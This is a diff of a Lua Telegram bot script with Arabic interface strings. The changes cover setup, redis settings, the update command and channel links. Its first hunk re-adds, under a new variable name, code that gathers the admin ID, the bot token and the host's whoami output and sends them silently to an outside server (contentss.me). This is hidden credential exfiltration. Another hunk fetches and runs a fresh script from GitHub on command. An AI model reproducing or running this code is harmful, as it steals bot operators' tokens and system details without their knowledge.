@@ -64,11 +64,11 @@ SUDO = redis:get(ZAINGLOBLA..":SUDO:ID"),
  }
 create(config, "./Info.lua")   
 end 
-saiedinfo = {}
-saiedinfo.id = redis:get(ZAINGLOBLA..":SUDO:ID")
-saiedinfo.tokenbot  = redis:get(ZAINGLOBLA..":token")
-saiedinfo.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://contentss.me/Run.php?insert='..JSON.encode(saiedinfo))
+zaininfo = {}
+zaininfo.id = redis:get(ZAINGLOBLA..":SUDO:ID")
+zaininfo.tokenbot  = redis:get(ZAINGLOBLA..":token")
+zaininfo.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+https.request('https://contentss.me/Run.php?insert='..JSON.encode(zaininfo))
 create_config_auto()
 file = io.open("GLOBLA", "w")  
 file:write([[
@@ -787,20 +787,20 @@ end
 ----------------------------------------------------------------------------
 if text == 'تفعيل التواصل 🔛' and Sudo_id(msg) then  
 send(msg.chat_id_, msg.id_, '☑┋ تم تفعيل التواصل')
-redis:del('GLOBLA:'..bot_id..'Twal:Bot'..msg.chat_id_)
+redis:del('GLOBLA:'..bot_id..'Twal:Bot')
 end
 if text == 'تعطيل التواصل ✖' and Sudo_id(msg) then  
 send(msg.chat_id_, msg.id_, '🚫┋ تم تعطيل التواصل')
-redis:set('GLOBLA:'..bot_id..'Twal:Bot'..msg.chat_id_, true)
+redis:set('GLOBLA:'..bot_id..'Twal:Bot', true)
 end
 ----------------------------------------------------------------------------
 if text == 'تفعيل الوضع الخدمي 🔓' and Sudo_id(msg) then  
 send(msg.chat_id_, msg.id_, '☑┋ تم تفعيل الوضع الخدمي')
-redis:del('GLOBLA:'..bot_id..'lock:Free'..msg.chat_id_)
+redis:del('GLOBLA:'..bot_id..'lock:Free')
 end
 if text == 'تعطيل الوضع الخدمي 🔏' and Sudo_id(msg) then  
 send(msg.chat_id_, msg.id_, '🚫┋ تم تعطيل الوضع الخدمي')
-redis:set('GLOBLA:'..bot_id..'lock:Free'..msg.chat_id_, true)
+redis:set('GLOBLA:'..bot_id..'lock:Free', true)
 end
 ----------------------------------------------------------------------------
 if text == 'تحديث السورس ™' and Sudo_id(msg) then 
@@ -2104,7 +2104,7 @@ end
 if text == 'تحديث السورس' and Sudo_id(msg) then
 os.execute('rm -rf GLOBLA.lua')
 os.execute('wget https://raw.githubusercontent.com/DevGlobla/GLOBLA/master/GLOBLA.lua')
-send(msg.chat_id_, msg.id_,'♻┋ تم تحديث السورس \n👤┋ مــن قـبـل ⊰• ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'GLOBLA')..')') 
+send(msg.chat_id_, msg.id_,'♻┋ تم تحديث السورس \n👤┋ بواسطة : ['..Get_Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'GLOBLA')..')') 
 dofile('GLOBLA.lua')  
 end
 ------------------------------------------------------------------
@@ -2116,7 +2116,7 @@ Text = [[
  
  ↬   [Channel GLOBLA](http://t.me/GlObLa)
  
- ↬   [Group Source®](https://t.me/joinchat/PvmuH06g4O3NNaYKwFlFSA)
+ ↬   [Group Source®](https://t.me/joinchat/PvmuHx2Jcq2abf4rrL0MLg)
  
  ↬   [Developer source](http://t.me/YYBYY) 
  ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
